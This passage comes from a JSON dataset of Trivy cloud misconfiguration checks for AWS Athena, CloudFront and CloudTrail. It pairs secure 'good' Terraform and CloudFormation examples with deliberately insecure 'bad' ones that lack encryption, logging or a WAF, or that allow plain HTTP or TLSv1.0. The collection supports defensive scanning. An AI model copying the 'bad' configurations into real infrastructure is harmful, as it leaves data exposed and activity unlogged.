              "resource \"aws_athena_database\" \"good_example\" {\n  name   = \"database_name\"\n  bucket = aws_s3_bucket.hoge.bucket\n\n  encryption_configuration {\n    encryption_option = \"SSE_KMS\"\n    kms_key_arn       = aws_kms_key.example.arn\n  }\n}",
              "resource \"aws_athena_workgroup\" \"good_example\" {\n  name = \"example\"\n\n  configuration {\n    enforce_workgroup_configuration    = true\n    publish_cloudwatch_metrics_enabled = true\n\n    result_configuration {\n      output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n\n      encryption_configuration {\n        encryption_option = \"SSE_KMS\"\n        kms_key_arn       = aws_kms_key.example.arn\n      }\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"aws_athena_database\" \"bad_example\" {\n  name   = \"database_name\"\n  bucket = aws_s3_bucket.hoge.bucket\n}",
              "resource \"aws_athena_workgroup\" \"bad_example\" {\n  name = \"example\"\n\n  configuration {\n    enforce_workgroup_configuration    = true\n    publish_cloudwatch_metrics_enabled = true\n\n    result_configuration {\n      output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ATHENA-NO_ENCRYPTION_OVERRIDE",
        "title": "No Encryption Override",
        "provider": "aws",
        "service": "athena",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Athena::WorkGroup\n          Properties:\n            Name: goodExample\n            WorkGroupConfiguration:\n              EnforceWorkGroupConfiguration: true\n              ResultConfiguration:\n                EncryptionConfiguration:\n                  EncryptionOption: SSE_KMS\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Athena::WorkGroup\n          Properties:\n            Name: badExample\n            WorkGroupConfiguration:\n              EnforceWorkGroupConfiguration: false\n              ResultConfiguration:\n                EncryptionConfiguration:\n                  EncryptionOption: SSE_KMS\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_workgroup#configuration\n  good:\n    - |-\n      resource \"aws_athena_workgroup\" \"good_example\" {\n        name = \"example\"\n\n        configuration {\n          enforce_workgroup_configuration    = true\n          publish_cloudwatch_metrics_enabled = true\n\n          result_configuration {\n            output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n\n            encryption_configuration {\n              encryption_option = \"SSE_KMS\"\n              kms_key_arn       = aws_kms_key.example.arn\n            }\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_athena_workgroup\" \"bad_example\" {\n        name = \"example\"\n\n        configuration {\n          enforce_workgroup_configuration    = false\n          publish_cloudwatch_metrics_enabled = true\n\n          result_configuration {\n            output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n\n            encryption_configuration {\n              encryption_option = \"SSE_KMS\"\n              kms_key_arn       = aws_kms_key.example.arn\n            }\n          }\n        }\n      }\n    - |-\n      resource \"aws_athena_workgroup\" \"bad_example\" {\n        name = \"example\"\n\n      }\n",
        "file_name": "no_encryption_override.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/athena/no_encryption_override.yaml",
        "local_path": "aws/athena/no_encryption_override.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Athena::WorkGroup\n    Properties:\n      Name: goodExample\n      WorkGroupConfiguration:\n        EnforceWorkGroupConfiguration: true\n        ResultConfiguration:\n          EncryptionConfiguration:\n            EncryptionOption: SSE_KMS"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Athena::WorkGroup\n    Properties:\n      Name: badExample\n      WorkGroupConfiguration:\n        EnforceWorkGroupConfiguration: false\n        ResultConfiguration:\n          EncryptionConfiguration:\n            EncryptionOption: SSE_KMS"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_workgroup#configuration"
            ],
            "good": [
              "resource \"aws_athena_workgroup\" \"good_example\" {\n  name = \"example\"\n\n  configuration {\n    enforce_workgroup_configuration    = true\n    publish_cloudwatch_metrics_enabled = true\n\n    result_configuration {\n      output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n\n      encryption_configuration {\n        encryption_option = \"SSE_KMS\"\n        kms_key_arn       = aws_kms_key.example.arn\n      }\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"aws_athena_workgroup\" \"bad_example\" {\n  name = \"example\"\n\n  configuration {\n    enforce_workgroup_configuration    = false\n    publish_cloudwatch_metrics_enabled = true\n\n    result_configuration {\n      output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n\n      encryption_configuration {\n        encryption_option = \"SSE_KMS\"\n        kms_key_arn       = aws_kms_key.example.arn\n      }\n    }\n  }\n}",
              "resource \"aws_athena_workgroup\" \"bad_example\" {\n  name = \"example\"\n\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDFRONT-ENABLE_LOGGING",
        "title": "Enable Logging",
        "provider": "aws",
        "service": "cloudfront",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::CloudFront::Distribution\n          Properties:\n            DistributionConfig:\n              DefaultCacheBehavior:\n                TargetOriginId: target\n                ViewerProtocolPolicy: https-only\n              Enabled: true\n              Logging:\n                Bucket: logging-bucket\n              Origins:\n                - DomainName: https://some.domain\n                  Id: somedomain1\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::CloudFront::Distribution\n          Properties:\n            DistributionConfig:\n              DefaultCacheBehavior:\n                TargetOriginId: target\n                ViewerProtocolPolicy: https-only\n              Enabled: true\n              Origins:\n                - DomainName: https://some.domain\n                  Id: somedomain1\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#logging_config\n  good:\n    - |-\n      resource \"aws_cloudfront_distribution\" \"good_example\" {\n        // other config\n        logging_config {\n          include_cookies = false\n          bucket          = \"mylogs.s3.amazonaws.com\"\n          prefix          = \"myprefix\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_cloudfront_distribution\" \"bad_example\" {\n        // other config\n        // no logging_config\n      }\n",
        "file_name": "enable_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudfront/enable_logging.yaml",
        "local_path": "aws/cloudfront/enable_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::CloudFront::Distribution\n    Properties:\n      DistributionConfig:\n        DefaultCacheBehavior:\n          TargetOriginId: target\n          ViewerProtocolPolicy: https-only\n        Enabled: true\n        Logging:\n          Bucket: logging-bucket\n        Origins:\n          - DomainName: https://some.domain\n            Id: somedomain1"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::CloudFront::Distribution\n    Properties:\n      DistributionConfig:\n        DefaultCacheBehavior:\n          TargetOriginId: target\n          ViewerProtocolPolicy: https-only\n        Enabled: true\n        Origins:\n          - DomainName: https://some.domain\n            Id: somedomain1"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#logging_config"
            ],
            "good": [
              "resource \"aws_cloudfront_distribution\" \"good_example\" {\n  // other config\n  logging_config {\n    include_cookies = false\n    bucket          = \"mylogs.s3.amazonaws.com\"\n    prefix          = \"myprefix\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_cloudfront_distribution\" \"bad_example\" {\n  // other config\n  // no logging_config\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDFRONT-ENABLE_WAF",
        "title": "Enable Waf",
        "provider": "aws",
        "service": "cloudfront",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::CloudFront::Distribution\n          Properties:\n            DistributionConfig:\n              DefaultCacheBehavior:\n                TargetOriginId: target\n                ViewerProtocolPolicy: https-only\n              Enabled: true\n              Logging:\n                Bucket: logging-bucket\n              Origins:\n                - DomainName: https://some.domain\n                  Id: somedomain1\n              WebACLId: waf_id\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::CloudFront::Distribution\n          Properties:\n            DistributionConfig:\n              DefaultCacheBehavior:\n                TargetOriginId: target\n                ViewerProtocolPolicy: https-only\n              Enabled: true\n              Logging:\n                Bucket: logging-bucket\n              Origins:\n                - DomainName: https://some.domain\n                  Id: somedomain1\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#web_acl_id\n  good:\n    - |-\n      resource \"aws_cloudfront_distribution\" \"good_example\" {\n\n        origin {\n          domain_name = aws_s3_bucket.primary.bucket_regional_domain_name\n          origin_id   = \"primaryS3\"\n\n          s3_origin_config {\n            origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n          }\n        }\n\n        origin {\n          domain_name = aws_s3_bucket.failover.bucket_regional_domain_name\n          origin_id   = \"failoverS3\"\n\n          s3_origin_config {\n            origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n          }\n        }\n\n        default_cache_behavior {\n          target_origin_id = \"groupS3\"\n        }\n\n        web_acl_id = \"waf_id\"\n      }\n  bad:\n    - |-\n      resource \"aws_cloudfront_distribution\" \"bad_example\" {\n        origin_group {\n          origin_id = \"groupS3\"\n\n          failover_criteria {\n            status_codes = [403, 404, 500, 502]\n          }\n\n          member {\n            origin_id = \"primaryS3\"\n          }\n        }\n\n        origin {\n          domain_name = aws_s3_bucket.primary.bucket_regional_domain_name\n          origin_id   = \"primaryS3\"\n\n          s3_origin_config {\n            origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n          }\n        }\n\n        origin {\n          domain_name = aws_s3_bucket.failover.bucket_regional_domain_name\n          origin_id   = \"failoverS3\"\n\n          s3_origin_config {\n            origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n          }\n        }\n\n        default_cache_behavior {\n          target_origin_id = \"groupS3\"\n        }\n      }\n",
        "file_name": "enable_waf.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudfront/enable_waf.yaml",
        "local_path": "aws/cloudfront/enable_waf.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::CloudFront::Distribution\n    Properties:\n      DistributionConfig:\n        DefaultCacheBehavior:\n          TargetOriginId: target\n          ViewerProtocolPolicy: https-only\n        Enabled: true\n        Logging:\n          Bucket: logging-bucket\n        Origins:\n          - DomainName: https://some.domain\n            Id: somedomain1\n        WebACLId: waf_id"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::CloudFront::Distribution\n    Properties:\n      DistributionConfig:\n        DefaultCacheBehavior:\n          TargetOriginId: target\n          ViewerProtocolPolicy: https-only\n        Enabled: true\n        Logging:\n          Bucket: logging-bucket\n        Origins:\n          - DomainName: https://some.domain\n            Id: somedomain1"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#web_acl_id"
            ],
            "good": [
              "resource \"aws_cloudfront_distribution\" \"good_example\" {\n\n  origin {\n    domain_name = aws_s3_bucket.primary.bucket_regional_domain_name\n    origin_id   = \"primaryS3\"\n\n    s3_origin_config {\n      origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n    }\n  }\n\n  origin {\n    domain_name = aws_s3_bucket.failover.bucket_regional_domain_name\n    origin_id   = \"failoverS3\"\n\n    s3_origin_config {\n      origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n    }\n  }\n\n  default_cache_behavior {\n    target_origin_id = \"groupS3\"\n  }\n\n  web_acl_id = \"waf_id\"\n}"
            ],
            "bad": [
              "resource \"aws_cloudfront_distribution\" \"bad_example\" {\n  origin_group {\n    origin_id = \"groupS3\"\n\n    failover_criteria {\n      status_codes = [403, 404, 500, 502]\n    }\n\n    member {\n      origin_id = \"primaryS3\"\n    }\n  }\n\n  origin {\n    domain_name = aws_s3_bucket.primary.bucket_regional_domain_name\n    origin_id   = \"primaryS3\"\n\n    s3_origin_config {\n      origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n    }\n  }\n\n  origin {\n    domain_name = aws_s3_bucket.failover.bucket_regional_domain_name\n    origin_id   = \"failoverS3\"\n\n    s3_origin_config {\n      origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n    }\n  }\n\n  default_cache_behavior {\n    target_origin_id = \"groupS3\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDFRONT-ENFORCE_HTTPS",
        "title": "Enforce Https",
        "provider": "aws",
        "service": "cloudfront",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::CloudFront::Distribution\n          Properties:\n            DistributionConfig:\n              DefaultCacheBehavior:\n                TargetOriginId: target\n                ViewerProtocolPolicy: https-only\n              Enabled: true\n              Logging:\n                Bucket: logging-bucket\n              Origins:\n                - DomainName: https://some.domain\n                  Id: somedomain1\n              WebACLId: waf_id\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::CloudFront::Distribution\n          Properties:\n            DistributionConfig:\n              DefaultCacheBehavior:\n                TargetOriginId: target\n                ViewerProtocolPolicy: allow-all\n              Enabled: true\n              Logging:\n                Bucket: logging-bucket\n              Origins:\n                - DomainName: https://some.domain\n                  Id: somedomain1\n              WebACLId: waf_id\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#viewer_protocol_policy\n  good:\n    - |-\n      resource \"aws_cloudfront_distribution\" \"good_example\" {\n        default_cache_behavior {\n          viewer_protocol_policy = \"redirect-to-https\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_cloudfront_distribution\" \"bad_example\" {\n        default_cache_behavior {\n          viewer_protocol_policy = \"allow-all\"\n        }\n      }\n    - |-\n      resource \"aws_cloudfront_distribution\" \"bad_example\" {\n        default_cache_behavior {\n          viewer_protocol_policy = \"https-only\"\n        }\n        ordered_cache_behavior {\n          viewer_protocol_policy = \"allow-all\"\n        }\n      }\n",
        "file_name": "enforce_https.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudfront/enforce_https.yaml",
        "local_path": "aws/cloudfront/enforce_https.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::CloudFront::Distribution\n    Properties:\n      DistributionConfig:\n        DefaultCacheBehavior:\n          TargetOriginId: target\n          ViewerProtocolPolicy: https-only\n        Enabled: true\n        Logging:\n          Bucket: logging-bucket\n        Origins:\n          - DomainName: https://some.domain\n            Id: somedomain1\n        WebACLId: waf_id"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::CloudFront::Distribution\n    Properties:\n      DistributionConfig:\n        DefaultCacheBehavior:\n          TargetOriginId: target\n          ViewerProtocolPolicy: allow-all\n        Enabled: true\n        Logging:\n          Bucket: logging-bucket\n        Origins:\n          - DomainName: https://some.domain\n            Id: somedomain1\n        WebACLId: waf_id"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#viewer_protocol_policy"
            ],
            "good": [
              "resource \"aws_cloudfront_distribution\" \"good_example\" {\n  default_cache_behavior {\n    viewer_protocol_policy = \"redirect-to-https\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_cloudfront_distribution\" \"bad_example\" {\n  default_cache_behavior {\n    viewer_protocol_policy = \"allow-all\"\n  }\n}",
              "resource \"aws_cloudfront_distribution\" \"bad_example\" {\n  default_cache_behavior {\n    viewer_protocol_policy = \"https-only\"\n  }\n  ordered_cache_behavior {\n    viewer_protocol_policy = \"allow-all\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDFRONT-USE_SECURE_TLS_POLICY",
        "title": "Use Secure Tls Policy",
        "provider": "aws",
        "service": "cloudfront",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::CloudFront::Distribution\n          Properties:\n            DistributionConfig:\n              DefaultCacheBehavior:\n                TargetOriginId: target\n                ViewerProtocolPolicy: https-only\n              Enabled: true\n              Logging:\n                Bucket: logging-bucket\n              Origins:\n                - DomainName: https://some.domain\n                  Id: somedomain1\n              ViewerCertificate:\n                MinimumProtocolVersion: TLSv1.2_2021\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::CloudFront::Distribution\n          Properties:\n            DistributionConfig:\n              DefaultCacheBehavior:\n                TargetOriginId: target\n                ViewerProtocolPolicy: https-only\n              Enabled: true\n              Logging:\n                Bucket: logging-bucket\n              Origins:\n                - DomainName: https://some.domain\n                  Id: somedomain1\n              ViewerCertificate:\n                MinimumProtocolVersion: TLSv1.0\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#minimum_protocol_version\n  good:\n    - |-\n      resource \"aws_cloudfront_distribution\" \"good_example\" {\n        viewer_certificate {\n          cloudfront_default_certificate = false\n          minimum_protocol_version       = \"TLSv1.2_2021\"\n        }\n      }\n    - |-\n      resource \"aws_cloudfront_distribution\" \"good_example\" {\n        viewer_certificate {\n          cloudfront_default_certificate = true\n          minimum_protocol_version       = \"TLSv1.0\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_cloudfront_distribution\" \"bad_example\" {\n        viewer_certificate {\n          cloudfront_default_certificate = false\n          minimum_protocol_version       = \"TLSv1.0\"\n        }\n      }\n    - |-\n      resource \"aws_cloudfront_distribution\" \"bad_example\" {\n        viewer_certificate {\n          cloudfront_default_certificate = false\n        }\n      }\n",
        "file_name": "use_secure_tls_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudfront/use_secure_tls_policy.yaml",
        "local_path": "aws/cloudfront/use_secure_tls_policy.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::CloudFront::Distribution\n    Properties:\n      DistributionConfig:\n        DefaultCacheBehavior:\n          TargetOriginId: target\n          ViewerProtocolPolicy: https-only\n        Enabled: true\n        Logging:\n          Bucket: logging-bucket\n        Origins:\n          - DomainName: https://some.domain\n            Id: somedomain1\n        ViewerCertificate:\n          MinimumProtocolVersion: TLSv1.2_2021"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::CloudFront::Distribution\n    Properties:\n      DistributionConfig:\n        DefaultCacheBehavior:\n          TargetOriginId: target\n          ViewerProtocolPolicy: https-only\n        Enabled: true\n        Logging:\n          Bucket: logging-bucket\n        Origins:\n          - DomainName: https://some.domain\n            Id: somedomain1\n        ViewerCertificate:\n          MinimumProtocolVersion: TLSv1.0"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#minimum_protocol_version"
            ],
            "good": [
              "resource \"aws_cloudfront_distribution\" \"good_example\" {\n  viewer_certificate {\n    cloudfront_default_certificate = false\n    minimum_protocol_version       = \"TLSv1.2_2021\"\n  }\n}",
              "resource \"aws_cloudfront_distribution\" \"good_example\" {\n  viewer_certificate {\n    cloudfront_default_certificate = true\n    minimum_protocol_version       = \"TLSv1.0\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_cloudfront_distribution\" \"bad_example\" {\n  viewer_certificate {\n    cloudfront_default_certificate = false\n    minimum_protocol_version       = \"TLSv1.0\"\n  }\n}",
              "resource \"aws_cloudfront_distribution\" \"bad_example\" {\n  viewer_certificate {\n    cloudfront_default_certificate = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDTRAIL-ENABLE_ALL_REGIONS",
        "title": "Enable All Regions",
        "provider": "aws",
        "service": "cloudtrail",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            IsLogging: true\n            IsMultiRegionTrail: true\n            S3BucketName: CloudtrailBucket\n            S3KeyPrefix: /trailing\n            TrailName: Cloudtrail\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            IsLogging: true\n            IsMultiRegionTrail: false\n            S3BucketName: CloudtrailBucket\n            S3KeyPrefix: /trailing\n            TrailName: Cloudtrail\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail\n  good:\n    - |-\n      resource \"aws_cloudtrail\" \"good_example\" {\n        is_multi_region_trail = true\n      }\n  bad:\n    - |-\n      resource \"aws_cloudtrail\" \"bad_example\" {\n\n      }\n",
        "file_name": "enable_all_regions.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudtrail/enable_all_regions.yaml",
        "local_path": "aws/cloudtrail/enable_all_regions.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      IsLogging: true\n      IsMultiRegionTrail: true\n      S3BucketName: CloudtrailBucket\n      S3KeyPrefix: /trailing\n      TrailName: Cloudtrail"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      IsLogging: true\n      IsMultiRegionTrail: false\n      S3BucketName: CloudtrailBucket\n      S3KeyPrefix: /trailing\n      TrailName: Cloudtrail"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail"
            ],
            "good": [
              "resource \"aws_cloudtrail\" \"good_example\" {\n  is_multi_region_trail = true\n}"
            ],
            "bad": [
              "resource \"aws_cloudtrail\" \"bad_example\" {\n\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDTRAIL-ENABLE_LOG_VALIDATION",
        "title": "Enable Log Validation",
        "provider": "aws",
        "service": "cloudtrail",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            EnableLogFileValidation: true\n            IsLogging: true\n            IsMultiRegionTrail: true\n            S3BucketName: CloudtrailBucket\n            S3KeyPrefix: /trailing\n            TrailName: Cloudtrail\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            IsLogging: true\n            IsMultiRegionTrail: false\n            S3BucketName: CloudtrailBucket\n            S3KeyPrefix: /trailing\n            TrailName: Cloudtrail\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#enable_log_file_validation\n  good:\n    - |-\n      resource \"aws_cloudtrail\" \"good_example\" {\n        enable_log_file_validation = true\n      }\n  bad:\n    - |-\n      resource \"aws_cloudtrail\" \"bad_example\" {\n      }\n",
        "file_name": "enable_log_validation.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudtrail/enable_log_validation.yaml",
        "local_path": "aws/cloudtrail/enable_log_validation.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      EnableLogFileValidation: true\n      IsLogging: true\n      IsMultiRegionTrail: true\n      S3BucketName: CloudtrailBucket\n      S3KeyPrefix: /trailing\n      TrailName: Cloudtrail"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      IsLogging: true\n      IsMultiRegionTrail: false\n      S3BucketName: CloudtrailBucket\n      S3KeyPrefix: /trailing\n      TrailName: Cloudtrail"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#enable_log_file_validation"
            ],
            "good": [
              "resource \"aws_cloudtrail\" \"good_example\" {\n  enable_log_file_validation = true\n}"
            ],
            "bad": [
              "resource \"aws_cloudtrail\" \"bad_example\" {\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDTRAIL-ENCRYPTION_CUSTOMER_KEY",
        "title": "Encryption Customer Key",
        "provider": "aws",
        "service": "cloudtrail",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-cloudtrail-trail.html#cfn-cloudtrail-trail-kmskeyid\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            IsLogging: true\n            IsMultiRegionTrail: true\n            KmsKeyId: alias/CloudtrailKey\n            S3BucketName: CloudtrailBucket\n            S3KeyPrefix: /trailing\n            TrailName: Cloudtrail\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            IsLogging: true\n            IsMultiRegionTrail: false\n            S3BucketName: CloudtrailBucket\n            S3KeyPrefix: /trailing\n            TrailName: Cloudtrail\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#kms_key_id\n  good:\n    - |-\n      resource \"aws_kms_key\" \"trail\" {\n        enable_key_rotation = true\n      }\n      resource \"aws_kms_alias\" \"trail\" {\n        name          = \"alias/trail\"\n        target_key_id = aws_kms_key.trail.key_id\n      }\n\n      resource \"aws_cloudtrail\" \"good_example\" {\n        kms_key_id = aws_kms_alias.trail.arn\n      }\n  bad:\n    - |-\n      resource \"aws_cloudtrail\" \"bad_example\" {\n      }\n",
        "file_name": "encryption_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudtrail/encryption_customer_key.yaml",
        "local_path": "aws/cloudtrail/encryption_customer_key.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-cloudtrail-trail.html#cfn-cloudtrail-trail-kmskeyid"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      IsLogging: true\n      IsMultiRegionTrail: true\n      KmsKeyId: alias/CloudtrailKey\n      S3BucketName: CloudtrailBucket\n      S3KeyPrefix: /trailing\n      TrailName: Cloudtrail"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      IsLogging: true\n      IsMultiRegionTrail: false\n      S3BucketName: CloudtrailBucket\n      S3KeyPrefix: /trailing\n      TrailName: Cloudtrail"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#kms_key_id"
            ],
            "good": [
              "resource \"aws_kms_key\" \"trail\" {\n  enable_key_rotation = true\n}\nresource \"aws_kms_alias\" \"trail\" {\n  name          = \"alias/trail\"\n  target_key_id = aws_kms_key.trail.key_id\n}\n\nresource \"aws_cloudtrail\" \"good_example\" {\n  kms_key_id = aws_kms_alias.trail.arn\n}"
            ],
            "bad": [
              "resource \"aws_cloudtrail\" \"bad_example\" {\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDTRAIL-ENSURE_CLOUDWATCH_INTEGRATION",
        "title": "Ensure Cloudwatch Integration",
        "provider": "aws",
        "service": "cloudtrail",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExampleTrail:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            CloudWatchLogsLogGroupArn: arn:aws:logs:us-east-1:123456789012:log-group:CloudTrail/DefaultLogGroup:*\n            TrailName: Cloudtrail\n  bad:\n    - |-\n      Resources:\n        BadExampleTrail:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            TrailName: Cloudtrail\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail\n  good:\n    - |-\n      resource \"aws_cloudtrail\" \"good_example\" {\n        cloud_watch_logs_group_arn = \"${aws_cloudwatch_log_group.example.arn}:*\"\n      }\n\n      resource \"aws_cloudwatch_log_group\" \"example\" {\n        name = \"Example\"\n      }\n  bad:\n    - |-\n      resource \"aws_cloudtrail\" \"bad_example\" {\n      }\n",
        "file_name": "ensure_cloudwatch_integration.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudtrail/ensure_cloudwatch_integration.yaml",
        "local_path": "aws/cloudtrail/ensure_cloudwatch_integration.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExampleTrail:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      CloudWatchLogsLogGroupArn: arn:aws:logs:us-east-1:123456789012:log-group:CloudTrail/DefaultLogGroup:*\n      TrailName: Cloudtrail"
            ],
            "bad": [
              "Resources:\n  BadExampleTrail:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      TrailName: Cloudtrail"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail"
            ],
            "good": [
